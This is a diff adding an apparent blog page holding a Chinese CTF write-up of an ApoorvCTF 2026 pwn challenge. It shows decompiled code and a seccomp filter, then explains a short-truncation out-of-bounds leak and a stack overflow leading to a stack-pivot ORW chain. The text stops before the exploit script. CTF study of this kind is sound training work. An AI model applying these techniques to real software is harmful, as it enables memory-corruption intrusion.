@@ -1,0 +1,798 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/666.jpg">
+  <link rel="icon" href="/img/666.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#ffffff">
+  <meta name="author" content="roxy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="ApoorvCTF&amp;DiceCTF 2026 pwns周末打了两场国外的ctf，都是半夜开赛，也是又倒了一回时差 做出来两道pwn 记录一下wp 1.ApoorvCTF binary exploitation这个比赛只有一道pwn 首先保护全开 main函数: 1234567891011121314151617181920212223242526272829303132&#x2F;* WARNING">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ApoorvCTF&amp;DiceCTF 2026 pwns">
+<meta property="og:url" content="https://rr00xxyy.github.io/2026/03/09/ApoorvCTF-DiceCTF-2026-pwns/index.html">
+<meta property="og:site_name" content="roxy&#39;s blog">
+<meta property="og:description" content="ApoorvCTF&amp;DiceCTF 2026 pwns周末打了两场国外的ctf，都是半夜开赛，也是又倒了一回时差 做出来两道pwn 记录一下wp 1.ApoorvCTF binary exploitation这个比赛只有一道pwn 首先保护全开 main函数: 1234567891011121314151617181920212223242526272829303132&#x2F;* WARNING">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-03-09T08:01:56.000Z">
+<meta property="article:modified_time" content="2026-04-15T16:32:37.580Z">
+<meta property="article:author" content="roxy">
+<meta property="article:tag" content="ORW">
+<meta property="article:tag" content="stack overflow">
+<meta property="article:tag" content="信息泄露">
+<meta property="article:tag" content="栈迁移">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>ApoorvCTF&amp;DiceCTF 2026 pwns - roxy&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/mui-fluid.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"rr00xxyy.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body class="post-page post-page">
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/a.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ApoorvCTF&amp;DiceCTF 2026 pwns"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-03-09 16:01" pubdate>
+          2026年3月9日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          13k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          105 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ApoorvCTF&amp;DiceCTF 2026 pwns</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="ApoorvCTF-DiceCTF-2026-pwns"><a href="#ApoorvCTF-DiceCTF-2026-pwns" class="headerlink" title="ApoorvCTF&amp;DiceCTF 2026 pwns"></a>ApoorvCTF&amp;DiceCTF 2026 pwns</h1><p>周末打了两场国外的ctf，都是半夜开赛，也是又倒了一回时差</p>
+<p>做出来两道pwn</p>
+<p>记录一下wp</p>
+<h2 id="1-ApoorvCTF-binary-exploitation"><a href="#1-ApoorvCTF-binary-exploitation" class="headerlink" title="1.ApoorvCTF binary exploitation"></a>1.ApoorvCTF binary exploitation</h2><p>这个比赛只有一道pwn</p>
+<p>首先保护全开</p>
+<p>main函数:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* WARNING: Unknown calling convention */</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-type">long</span> lVar1;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <br>  lVar1 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>,(<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>,(<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stderr</span>,(<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;=====================================================&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;   H A V O K \&#x27; S   C O S M I C   R I N G S&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;=====================================================&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;  Alex Summers channels the cosmic spectrum through&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;  four concentric plasma rings.  Calibrate them.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;  Break them.  Claim what lies beyond.\n&quot;</span>);<br>  setup_seccomp();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Ring calibration pass 1 of 2:&quot;</span>);<br>  calibrate_rings();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[*] Ring calibration pass 2 of 2:&quot;</span>);<br>  calibrate_rings();<br>  read_plasma_signature();<br>  inject_plasma();<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_001023f8);<br>  <span class="hljs-keyword">if</span> (lVar1 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    __stack_chk_fail();<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>ban掉了<code>execve</code></p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><span class="hljs-punctuation">=</span><br>   H A V O K &#x27; S   C O S M I C   R I N G S<br>=====================================================<br>  Alex Summers channels the cosmic spectrum through<br>  four concentric plasma rings.  Calibrate them.<br>  Break them.  Claim what lies beyond.<br><br> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: 0x20 0x00 0x00 0x<span class="hljs-number">00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: 0x15 0x01 0x00 0xc<span class="hljs-number">000003</span>e  if (A == ARCH_X86_64) goto <span class="hljs-number">0003</span><br> <span class="hljs-number">0002</span>: 0x06 0x00 0x00 0x<span class="hljs-number">00000000</span>  return KILL<br> <span class="hljs-number">0003</span>: 0x20 0x00 0x00 0x<span class="hljs-number">00000000</span>  A = sys_number<br> <span class="hljs-number">0004</span>: 0x15 0x03 0x00 0x<span class="hljs-number">000000</span>3b  if (A == execve) goto <span class="hljs-number">0008</span><br> <span class="hljs-number">0005</span>: 0x15 0x02 0x00 0x<span class="hljs-number">00000142</span>  if (A == execveat) goto <span class="hljs-number">0008</span><br> <span class="hljs-number">0006</span>: 0x15 0x01 0x00 0x<span class="hljs-number">00000039</span>  if (A == fork) goto <span class="hljs-number">0008</span><br> <span class="hljs-number">0007</span>: 0x15 0x00 0x01 0x<span class="hljs-number">00000038</span>  if (A != clone) goto <span class="hljs-number">0009</span><br> <span class="hljs-number">0008</span>: 0x06 0x00 0x00 0x<span class="hljs-number">00000000</span>  return KILL<br> <span class="hljs-number">0009</span>: 0x06 0x00 0x00 0x7fff<span class="hljs-number">0000</span>  return ALLOW<br></code></pre></td></tr></table></figure>
+
+<p>虽然存在后门函数，但是没用，因为<code>system(&quot;/bin/sh&quot;)</code>的底层还是调用了<code>execve</code>，所以只能打<code>ORW</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">cosmic_release</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-type">long</span> lVar1;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <br>  lVar1 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  <span class="hljs-keyword">if</span> (lVar1 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    __stack_chk_fail();<br>  &#125;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>接下来调用了两次<code>calibrate_rings</code>函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">calibrate_rings</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-type">long</span> lVar1;<br>  <span class="hljs-type">short</span> sVar2;<br>  <span class="hljs-type">int</span> iVar3;<br>  <span class="hljs-type">size_t</span> sVar4;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">short</span> index;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">int</span> raw;<br>  anon_struct_48_3_decdb330 frame;<br>  <span class="hljs-type">char</span> idx_buf [<span class="hljs-number">32</span>];<br>  <span class="hljs-type">char</span> label [<span class="hljs-number">128</span>];<br>  <br>  lVar1 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  frame.libc_anchor = (longlong)<span class="hljs-built_in">puts</span>;<br>  frame.pie_anchor = (longlong)main;<br>  frame.ring_data[<span class="hljs-number">0</span>] = <span class="hljs-number">-0x3f0011ffffffffff</span>;<br>  frame.ring_data[<span class="hljs-number">1</span>] = <span class="hljs-number">-0x3f0011fffffffffe</span>;<br>  frame.ring_data[<span class="hljs-number">2</span>] = <span class="hljs-number">-0x3f0011fffffffffd</span>;<br>  frame.ring_data[<span class="hljs-number">3</span>] = <span class="hljs-number">-0x3f0011fffffffffc</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[RING 1] Cosmic Ring Calibration Interface&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_00102040);<br>  <span class="hljs-built_in">memset</span>(idx_buf,<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>);<br>  read(<span class="hljs-number">0</span>,idx_buf,<span class="hljs-number">0x1f</span>);<br>  sVar4 = <span class="hljs-built_in">strcspn</span>(idx_buf,<span class="hljs-string">&quot;\n&quot;</span>);<br>  idx_buf[sVar4] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>  iVar3 = atoi(idx_buf);<br>  <span class="hljs-keyword">if</span> (iVar3 &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[!] Negative indices are not permitted.&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    sVar2 = (<span class="hljs-type">short</span>)iVar3;<br>    <span class="hljs-keyword">if</span> (sVar2 &lt; <span class="hljs-number">4</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Ring-%d energy: 0x%016llx\n&quot;</span>,(ulong)(uint)(<span class="hljs-type">int</span>)sVar2,frame.ring_data[(<span class="hljs-type">int</span>)sVar2]);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[!] Index out of calibration range.&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;    Provide a label for this ring reading:&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(label,<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>);<br>    read(<span class="hljs-number">0</span>,label,<span class="hljs-number">0x7f</span>);<br>    sVar4 = <span class="hljs-built_in">strcspn</span>(label,<span class="hljs-string">&quot;\n&quot;</span>);<br>    label[sVar4] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; label[i] != <span class="hljs-string">&#x27;\0&#x27;</span>; i = i + <span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-keyword">if</span> (label[i] == <span class="hljs-string">&#x27;%&#x27;</span>) &#123;<br>        label[i] = <span class="hljs-string">&#x27;_&#x27;</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[LOG] %s\n&quot;</span>,label);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (lVar1 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    __stack_chk_fail();<br>  &#125;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到<code>栈帧</code>的布局为</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">|<span class="hljs-string"> ring_data[3] </span>|<br>|<span class="hljs-string"> ring_data[2] </span>|<br>|<span class="hljs-string"> ring_data[1] </span>|<br>|<span class="hljs-string"> ring_data[0] </span>|<br>|<span class="hljs-string"> pie_anchor   </span>|<span class="hljs-string"> -&gt; main</span><br><span class="hljs-string"></span>|<span class="hljs-string"> libc_anchor  </span>|<span class="hljs-string"> -&gt; puts</span><br></code></pre></td></tr></table></figure>
+
+<p>重点关注:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">sVar2 = (<span class="hljs-type">short</span>)iVar3;<br><br><span class="hljs-keyword">if</span> (sVar2 &lt; <span class="hljs-number">4</span>)<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;energy: %llx&quot;</span>, frame.ring_data[sVar2]);<br></code></pre></td></tr></table></figure>
+
+<p>存在<code>int -&gt; short</code>的类型截断，且程序只检查<code>sVar2 &lt; 4</code>，但没有检查<code>sVar2 &gt;= 0</code>，因此可以利用以实现负索引越界读取</p>
+<p>输入<code>65535</code></p>
+<p>转换后</p>
+<p><code>(short)65535 = -1</code></p>
+<p>于是就能泄露<code>frame.ring_data[-1]</code>，即<code>pie_anchor</code></p>
+<p>输入<code>65534</code></p>
+<p><code>(short)65534 = -2</code></p>
+<p>泄露<code>frame.ring_data[-2]</code></p>
+<p>即<code>libc_anchor</code></p>
+<p>我们就得到了pie基址和libc基址</p>
+<p>随后调用:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">read_plasma_signature</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-type">long</span> lVar1;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <br>  lVar1 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[RING 3] Upload Plasma Signature (up to 256 bytes):&quot;</span>);<br>  plasma_len = read(<span class="hljs-number">0</span>,plasma_sig,<span class="hljs-number">0x100</span>);<br>  <span class="hljs-keyword">if</span> (plasma_len &lt; <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[!] No signature received.&quot;</span>);<br>    plasma_len = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Signature received (%zd bytes). Buffered in cosmic memory.\n&quot;</span>,plasma_len);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (lVar1 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    __stack_chk_fail();<br>  &#125;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>向全局变量<code>plasma_sig</code>读入至多256字节，不存在溢出</p>
+<p>最后</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">inject_plasma</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <span class="hljs-type">char</span> confirm [<span class="hljs-number">32</span>];<br>  <br>  <span class="hljs-keyword">if</span> (plasma_len == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[!] No plasma signature loaded. Aborting.&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    iVar1 = validate_plasma();<br>    <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[!] Plasma resonance failure. Signature purged.&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n[RING 3] Initiating plasma injection sequence...&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;         Confirm injection key:&quot;</span>);<br>      read(<span class="hljs-number">0</span>,confirm,<span class="hljs-number">0x30</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Injection acknowledged.&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>存在溢出</p>
+<p>刚好可以覆盖<code>saved rbp</code>和返回地址</p>
+<p>于是便有思路了</p>
+<p>先在<code>plasma_sig</code>中布局我们的<code>ORW rop</code></p>
+<p>随后构造saved_rbp为plasma_sig的地址</p>
+<p>返回地址设置为经典gadget</p>
+<p><code>leave; ret;</code></p>
+<p>实现栈迁移</p>
+<p>控制执行流</p>
+<p>不过一切都基于泄露的pie基址和libc基址送来的gadget大礼包</p>
+<p>下面是<strong>exp</strong></p>
